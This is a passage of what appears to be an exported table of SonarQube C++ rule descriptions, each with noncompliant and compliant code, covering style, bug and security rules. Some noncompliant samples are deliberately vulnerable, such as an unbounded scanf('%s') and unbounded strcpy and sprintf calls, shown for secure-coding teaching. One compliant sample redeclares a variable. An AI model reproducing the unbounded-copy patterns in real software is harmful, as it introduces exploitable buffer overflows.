</ul>",Standard namespaces should not be modified,[],CRITICAL,"['cert', 'cpp11']",CODE_SMELL
2016-07-20T11:22:22+0200,"<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>
members, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a
<code>final</code> class <code>protected</code> is confusingly pointless.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class C final {
protected:  // Noncompliant
  void fun();
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class C final {
private:
  void fun();
};
</pre>
<h2>Exceptions</h2>
<p>When overriding a base class function, it is common practice to keep the same visibility as for the base class. This rule ignores
<code>protected</code> functions in a <code>final</code> class that are overrides of a base class <code>protected</code> function.</p>",cpp:S2156,cpp,C++,"<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>
members, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a
<code>final</code> class <code>protected</code> is confusingly pointless.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class C final {
protected:  // Noncompliant
  void fun();
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class C final {
private:
  void fun();
};
</pre>
<h2>Exceptions</h2>
<p>When overriding a base class function, it is common practice to keep the same visibility as for the base class. This rule ignores
<code>protected</code> functions in a <code>final</code> class that are overrides of a base class <code>protected</code> function.</p>","""final"" classes should not have ""protected"" members",[],MINOR,"['confusing', 'cpp11']",CODE_SMELL
2014-06-30T14:50:25+0200,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that type specifiers always appear in the following order:</p>
<ol>
  <li> <code>typedef</code> </li>
  <li> type name, spelling of built-in types with more than one type-specifier:
    <ol>
      <li> signedness - <code>signed</code> or <code>unsigned</code> </li>
      <li> last single type-specifier or
        <ul>
          <li> <code>short int</code> </li>
          <li> <code>long int</code> </li>
          <li> <code>long long int</code> </li>
          <li> <code>long double</code> </li>
        </ul> </li>
    </ol> </li>
</ol>
<p>Since the positioning of the <code>const</code> keyword is controversial, this rule does not check it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int typedef T;

double long d;
char unsigned ch;
long signed int i;

</pre>
<h2>Compliant Solution</h2>
<pre>
typedef int T;

long double d;
unsigned char ch;
signed long int i;

</pre>",cpp:S1749,cpp,C++,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that type specifiers always appear in the following order:</p>
<ol>
  <li> <code>typedef</code> </li>
  <li> type name, spelling of built-in types with more than one type-specifier:
    <ol>
      <li> signedness - <code>signed</code> or <code>unsigned</code> </li>
      <li> last single type-specifier or
        <ul>
          <li> <code>short int</code> </li>
          <li> <code>long int</code> </li>
          <li> <code>long long int</code> </li>
          <li> <code>long double</code> </li>
        </ul> </li>
    </ol> </li>
</ol>
<p>Since the positioning of the <code>const</code> keyword is controversial, this rule does not check it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int typedef T;

double long d;
char unsigned ch;
long signed int i;

</pre>
<h2>Compliant Solution</h2>
<pre>
typedef int T;

long double d;
unsigned char ch;
signed long int i;

</pre>",Type specifiers should be listed in a standard order,[],MINOR,[],CODE_SMELL
2017-04-11T12:32:42+0200,"<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>",cpp:S3923,cpp,C++,"<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>",All branches in a conditional structure should not have exactly the same implementation,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",cpp:CommentedCode,cpp,C++,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",Sections of code should not be commented out,[],MAJOR,"['misra', 'unused']",CODE_SMELL
2016-03-18T17:11:17+0100,"<p>Like a clever insect posing as a leaf, there are constructs in C++ which look like variable declarations, but which are actually interpreted by the
compiler as function or function pointer declarations. Beyond the problem of confusing maintainers, it's highly likely in such cases that what the
coder intended is not what the compiler will do.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doWork(Status status) {
  Lock lock();  // Noncompliant; declares function named ""lock""
  ...
  Form form(ProgressBar(status)); // Noncompliant; declares function named ""form"" with ""status"" parameter
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doWork(Status status) {
  Lock lock;  // remove the parentheses to declare a variable
  ...
  Form form((ProgressBar(status))); // add a pair of parentheses to declare a variable
  ...
}
</pre>
<p>Since C++11 you can also use direct initialization to declare a variable:</p>
<pre>
void doWork(Status status) {
  Lock lock{};
  ...
  Form form{ProgressBar{status}};
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/zwCyAQ"">CERT, DCL53-CPP.</a> - Do not write syntactically ambiguous declarations </li>
</ul>",cpp:S3468,cpp,C++,"<p>Like a clever insect posing as a leaf, there are constructs in C++ which look like variable declarations, but which are actually interpreted by the
compiler as function or function pointer declarations. Beyond the problem of confusing maintainers, it's highly likely in such cases that what the
coder intended is not what the compiler will do.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doWork(Status status) {
  Lock lock();  // Noncompliant; declares function named ""lock""
  ...
  Form form(ProgressBar(status)); // Noncompliant; declares function named ""form"" with ""status"" parameter
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doWork(Status status) {
  Lock lock;  // remove the parentheses to declare a variable
  ...
  Form form((ProgressBar(status))); // add a pair of parentheses to declare a variable
  ...
}
</pre>
<p>Since C++11 you can also use direct initialization to declare a variable:</p>
<pre>
void doWork(Status status) {
  Lock lock{};
  ...
  Form form{ProgressBar{status}};
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/zwCyAQ"">CERT, DCL53-CPP.</a> - Do not write syntactically ambiguous declarations </li>
</ul>",Function declarations that look like variable declarations should not be used,[],MAJOR,['cert'],BUG
2017-02-03T13:58:45+0100,"<p>There are three distinct <code>char</code> types, (plain) <code>char</code>, <code>signed char</code> and <code>unsigned char</code>. <code>signed
char</code> and <code>unsigned char</code> should only be used for numeric data, and plain <code>char</code> should only be used for character data.
Since it is implementation-defined, the signedness of the plain <code>char</code> type should not be assumed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
signed char a = 'a'; // Noncompliant, explicitly signed
unsigned char b = '\r'; // Noncompliant, explicitly unsigned
char c = 10; // Noncompliant

unsigned char d = c; // Noncompliant, d is explicitly signed while c is not
char e = a; // Noncompliant, a is explicitly signed while e is not
</pre>
<h2>Compliant Solution</h2>
<pre>
char a = 'a';
char b = '\r';
unsigned char c = 10;
signed char c = 10;
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Since the integer value 0 is used as a sentinel for the end of a string, converting this value to char is ignored. </li>
</ul>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 6.1 - The plain char type shall be used only for the storage and use of character values </li>
  <li> MISRA C:2004, 6.2 - signed and unsigned char type shall be used only for the storage and use of number values </li>
  <li> MISRA C++:2008, 5-0-11 - The plain char type shall only be used for the storage and use of character values </li>
  <li> MISRA C++:2008, 5-0-12 - signed char and unsigned char type shall only be used for the storage and use of numeric values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/-As"">CERT, INT07-C.</a> - Use only explicitly signed or unsigned char type for numeric
  values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/5AD7"">CERT, STR00-C.</a> - Represent characters using an appropriate type </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/JABi"">CERT, STR04-C.</a> - Use plain char for characters in the basic character set
  </li>
</ul>",cpp:S810,cpp,C++,"<p>There are three distinct <code>char</code> types, (plain) <code>char</code>, <code>signed char</code> and <code>unsigned char</code>. <code>signed
char</code> and <code>unsigned char</code> should only be used for numeric data, and plain <code>char</code> should only be used for character data.
Since it is implementation-defined, the signedness of the plain <code>char</code> type should not be assumed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
signed char a = 'a'; // Noncompliant, explicitly signed
unsigned char b = '\r'; // Noncompliant, explicitly unsigned
char c = 10; // Noncompliant

unsigned char d = c; // Noncompliant, d is explicitly signed while c is not
char e = a; // Noncompliant, a is explicitly signed while e is not
</pre>
<h2>Compliant Solution</h2>
<pre>
char a = 'a';
char b = '\r';
unsigned char c = 10;
signed char c = 10;
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Since the integer value 0 is used as a sentinel for the end of a string, converting this value to char is ignored. </li>
</ul>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 6.1 - The plain char type shall be used only for the storage and use of character values </li>
  <li> MISRA C:2004, 6.2 - signed and unsigned char type shall be used only for the storage and use of number values </li>
  <li> MISRA C++:2008, 5-0-11 - The plain char type shall only be used for the storage and use of character values </li>
  <li> MISRA C++:2008, 5-0-12 - signed char and unsigned char type shall only be used for the storage and use of numeric values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/-As"">CERT, INT07-C.</a> - Use only explicitly signed or unsigned char type for numeric
  values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/5AD7"">CERT, STR00-C.</a> - Represent characters using an appropriate type </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/JABi"">CERT, STR04-C.</a> - Use plain char for characters in the basic character set
  </li>
</ul>",Appropriate char types should be used for character and integer values,[],MINOR,"['cert', 'confusing', 'misra']",CODE_SMELL
2014-08-07T09:36:27+0200,"<p>While it is possible to define a <code>struct</code> with member functions in C++, the general expectation is that <code>struct</code>s only
aggregate data, while classes are used for fully encapsulated abstractions, containing data and methods. Thus, including a member function in a
<code>struct</code> is likely to lead to confusion at best and should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct S
{
  S(int x, int y) : x(x), y(y) {}
  int x;
  int y;
  public:
    int fun(); // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct S
{
  S(int x, int y) : x(x), y(y) {}
  int x;
  int y;
};
</pre>
<h2>Exceptions</h2>
<p>Constructors are ignored for this rule, because they are the only way that a <code>struct</code> designer can enforce that all fields of a
<code>struct</code> are correctly initialized.</p>",cpp:S1771,cpp,C++,"<p>While it is possible to define a <code>struct</code> with member functions in C++, the general expectation is that <code>struct</code>s only
aggregate data, while classes are used for fully encapsulated abstractions, containing data and methods. Thus, including a member function in a
<code>struct</code> is likely to lead to confusion at best and should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct S
{
  S(int x, int y) : x(x), y(y) {}
  int x;
  int y;
  public:
    int fun(); // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct S
{
  S(int x, int y) : x(x), y(y) {}
  int x;
  int y;
};
</pre>
<h2>Exceptions</h2>
<p>Constructors are ignored for this rule, because they are the only way that a <code>struct</code> designer can enforce that all fields of a
<code>struct</code> are correctly initialized.</p>","A ""struct"" should not have member functions",[],MAJOR,['pitfall'],CODE_SMELL
2014-06-30T14:50:25+0200,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf(""i is %d"", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i is %d"", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
  }
}
</pre>",cpp:S1751,cpp,C++,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf(""i is %d"", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i is %d"", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
  }
}
</pre>",Loops with at most one iteration should be refactored,[],MAJOR,[],BUG
2014-11-07T16:16:36+0100,"<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=cpp%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>",cpp:S1871,cpp,C++,"<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule {rule:cpp:S3923} raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>",Two branches in a conditional structure should not have exactly the same implementation,[],MAJOR,"['design', 'suspicious']",CODE_SMELL
2013-09-16T11:41:24+0200,"<p>The <code>%s</code> placeholder is used to read a word into a string.</p>
<p>By default, there is no restriction on the length of that word, and the developer is required to pass a sufficiently large buffer for storing
it.</p>
<p>No matter how large the buffer is, there will always be a longer word.</p>
<p>Therefore, programs relying on <code>%s</code> are vulnerable to buffer overflows.</p>
<p>A field width specifier can be used together with the <code>%s</code> placeholder to limit the number of bytes which will by written to the
buffer.</p>
<p>Note that an additional byte is required to store the null terminator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
char buffer[10];
scanf(""%s"", buffer);      // Noncompliant - will overflow when a word longer than 9 characters is entered
</pre>
<h2>Compliant Solution</h2>
<pre>
char buffer[10];
scanf(""%9s"", buffer);     // Compliant - will not overflow
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",cpp:S1079,cpp,C++,"<p>The <code>%s</code> placeholder is used to read a word into a string.</p>
<p>By default, there is no restriction on the length of that word, and the developer is required to pass a sufficiently large buffer for storing
it.</p>
<p>No matter how large the buffer is, there will always be a longer word.</p>
<p>Therefore, programs relying on <code>%s</code> are vulnerable to buffer overflows.</p>
<p>A field width specifier can be used together with the <code>%s</code> placeholder to limit the number of bytes which will by written to the
buffer.</p>
<p>Note that an additional byte is required to store the null terminator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
char buffer[10];
scanf(""%s"", buffer);      // Noncompliant - will overflow when a word longer than 9 characters is entered
</pre>
<h2>Compliant Solution</h2>
<pre>
char buffer[10];
scanf(""%9s"", buffer);     // Compliant - will not overflow
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>","""scanf()"" and ""fscanf()"" format strings should specify a field width for the ""%s"" string placeholder",[],CRITICAL,"['cwe', 'injection', 'sans-top25-risky']",VULNERABILITY
2014-06-30T14:50:25+0200,"<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, <code>goto</code>) and <code>throw</code> expressions move control
flow out of the current code block. So any unlabelled statements that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;       // Noncompliant
  i++;             // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",cpp:S1763,cpp,C++,"<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, <code>goto</code>) and <code>throw</code> expressions move control
flow out of the current code block. So any unlabelled statements that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;       // Noncompliant
  i++;             // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Jump statements should not be followed by dead code,[],MAJOR,"['cert', 'cwe', 'misra', 'unused']",BUG
2014-06-30T14:50:25+0200,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  do_z();
}
if ( a != a ) { // always false
  do_y();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  do_x();
}
if (a == b || a == b ) { // if the first one is true, the second one is too
  do_w();
}

if (5 / 5) { // always 1
  do_v();
}
if (5 - 5) { // always 0
  do_u();
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored:</p>
<ul>
  <li> The expression <code>1 &lt;&lt; 1</code> </li>
  <li> When an increment or decrement operator is used, ex: <code>*p++ == *p++</code> </li>
  <li> Bitwise operators <code>|, &amp;, ^</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=cpp%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>",cpp:S1764,cpp,C++,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  do_z();
}
if ( a != a ) { // always false
  do_y();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  do_x();
}
if (a == b || a == b ) { // if the first one is true, the second one is too
  do_w();
}

if (5 / 5) { // always 1
  do_v();
}
if (5 - 5) { // always 0
  do_u();
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored:</p>
<ul>
  <li> The expression <code>1 &lt;&lt; 1</code> </li>
  <li> When an increment or decrement operator is used, ex: <code>*p++ == *p++</code> </li>
  <li> Bitwise operators <code>|, &amp;, ^</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> {rule:cpp:S1656} - Implements a check on <code>=</code>. </li>
</ul>",Identical expressions should not be used on both sides of a binary operator,[],MAJOR,['cert'],BUG
2016-08-24T19:11:25+0200,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  saveDocument();
} catch (const std::exception&amp; e) { // Noncompliant
  throw;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  saveDocument();
} catch (const std::exception&amp; e) { // Compliant
  log &lt;&lt; e.what();
  throw;
}
</pre>
<p>or</p>
<pre>
saveDocument();
</pre>",cpp:S2737,cpp,C++,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  saveDocument();
} catch (const std::exception&amp; e) { // Noncompliant
  throw;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  saveDocument();
} catch (const std::exception&amp; e) { // Compliant
  log &lt;&lt; e.what();
  throw;
}
</pre>
<p>or</p>
<pre>
saveDocument();
</pre>","""catch"" clauses should do more than rethrow",[],MINOR,"['clumsy', 'error-handling', 'finding', 'unused']",CODE_SMELL
2013-09-16T11:41:24+0200,"<p>When using legacy C functions such as <code>strcpy</code>, it's up to the developer to make sure the size of the buffer to be written to is large
enough to avoid buffer overruns. If this is not done properly, it can result in a buffer overflow, causing the program to crash at a minimum. At
worst, a carefully crafted overflow can cause malicious code to be executed.</p>
<p>In such cases, it's better to use an alternate, secure, function, such as <code>strlcpy()</code>, <code>strlcat()</code> and
<code>snprintf()</code>, which allows you to define the maximum number of characters to be written to the buffer. However, since
<code>strlcpy()</code> and <code>strlcat()</code> are part of the BSD library, they might not be available, in which case <code>strncpy()</code> and
<code>strncat()</code> should be used instead, but be aware that they don't guarantee the string will be null-terminated.</p>
<p>This rule logs an issue when encountering the following insecure functions: <code>strcpy()</code>, <code>strcat()</code> and
<code>sprintf()</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
sprintf(str, ""%s"", message);   // Noncompliant
strcpy(str, message); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), ""%s"", message);
strlcpy(str, message, sizeof(str));

strncpy(str, message, sizeof(str) -1); // Leave room for null
str[sizeof(str) - 1] = '\0'; // Make sure the string is null-terminated
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> OWASP Top 10 2017 Category A9 - Using Components with Known Vulnerabilities </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QwY"">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",cpp:S1081,cpp,C++,"<p>When using legacy C functions such as <code>strcpy</code>, it's up to the developer to make sure the size of the buffer to be written to is large
enough to avoid buffer overruns. If this is not done properly, it can result in a buffer overflow, causing the program to crash at a minimum. At
worst, a carefully crafted overflow can cause malicious code to be executed.</p>
<p>In such cases, it's better to use an alternate, secure, function, such as <code>strlcpy()</code>, <code>strlcat()</code> and
